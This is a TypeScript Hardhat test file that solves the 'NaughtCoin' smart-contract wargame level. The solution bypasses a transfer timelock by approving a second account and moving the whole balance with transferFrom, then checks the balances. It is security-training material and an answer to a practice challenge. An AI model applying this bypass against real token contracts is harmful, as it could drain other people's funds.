import { expect } from "chai";
import { ethers } from "hardhat";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { NaughtCoin } from "../typechain";

describe("NaughtCoin.test", function () {
  let naughtCoin: NaughtCoin;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    const signers = await ethers.getSigners();
    deployer = signers[0];
    attacker = signers[1];

    const NaughtCoinFactory = await ethers.getContractFactory(
      "contracts/NaughtCoin.sol:NaughtCoin",
      deployer
    );
    naughtCoin = (await NaughtCoinFactory.deploy(
      deployer.address
    )) as NaughtCoin;
  });

  it("before attack", async () => {
    expect(await naughtCoin.balanceOf(deployer.address)).to.eq(
      await naughtCoin.totalSupply()
    );
  });

  it("on attack", async function () {
    const balanceOf = await naughtCoin.balanceOf(deployer.address);

    await naughtCoin.connect(deployer).approve(attacker.address, balanceOf);

    await naughtCoin
      .connect(attacker)
      .transferFrom(deployer.address, attacker.address, balanceOf);

    expect(await naughtCoin.balanceOf(deployer.address)).to.eq(0);
  });
  it("after attack", async function () {
    expect(await naughtCoin.balanceOf(attacker.address)).to.eq(
      await naughtCoin.totalSupply()
    );
  });
});
